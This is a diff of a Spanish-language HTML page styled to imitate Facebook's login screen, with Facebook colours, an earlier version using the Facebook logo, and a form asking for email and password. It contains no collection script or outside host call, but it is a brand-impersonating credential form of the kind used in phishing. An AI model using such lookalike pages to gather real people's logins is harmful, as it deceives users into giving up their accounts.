@@ -1,89 +1,78 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Inicio de Sesión en Facebook</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 400px;
-      margin: 50px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-    }
-    .facebook-logo {
-      width: 150px;
-      margin: 0 auto 20px;
-      display: block;
-    }
-    input[type="text"], input[type="password"] {
-      width: calc(100% - 40px);
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #dddfe2;
-      border-radius: 8px;
-      box-sizing: border-box;
-      background-color: #f0f2f5;
-      font-size: 14px;
-      padding-left: 40px;
-      height: 40px;
-    }
-    input[type="text"]::placeholder, input[type="password"]::placeholder {
-      color: #8d949e;
-    }
-    input[type="submit"] {
-      width: calc(100% - 40px);
-      background-color: #1877f2;
-      color: #fff;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-      font-weight: 600;
-      margin-top: 10px;
-      transition: background-color 0.3s;
-      height: 40px;
-    }
-    input[type="submit"]:hover {
-      background-color: #166fe5;
-    }
-    .forgot-password {
-      text-align: center;
-      margin-top: 10px;
-      font-size: 14px;
-      color: #1877f2;
-    }
-    .signup-link {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 14px;
-      color: #1877f2;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de sesión con Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin: 100px auto;
+            width: 400px;
+            text-align: center;
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .btn-fb {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .btn-fb:hover {
+            background-color: #0e62a7;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .btn-login {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .btn-login:hover {
+            background-color: #0e62a7;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
-    <form action="/login" method="post">
-      <input type="text" id="email" name="email" placeholder="Correo electrónico" required>
-      <input type="password" id="password" name="password" placeholder="Contraseña" required>
-      <input type="submit" value="Iniciar sesión">
-    </form>
-    <div class="forgot-password">
-      <a href="/recuperar">¿Olvidaste tu contraseña?</a>
+    <div class="container">
+        <h2>Iniciar sesión en Facebook</h2>
+        <button class="btn-fb">Iniciar sesión con Facebook</button>
+        <p>O inicia sesión con tu correo electrónico</p>
+        <form action="#" method="post">
+            <input type="text" name="email" placeholder="Correo electrónico" required><br>
+            <input type="password" name="password" placeholder="Contraseña" required><br>
+            <button type="submit" class="btn-login">Iniciar sesión</button>
+        </form>
     </div>
-    <div class="signup-link">
-      ¿No tienes una cuenta? <a href="/registro">Regístrate</a>
-    </div>
-  </div>
 </body>
 </html>
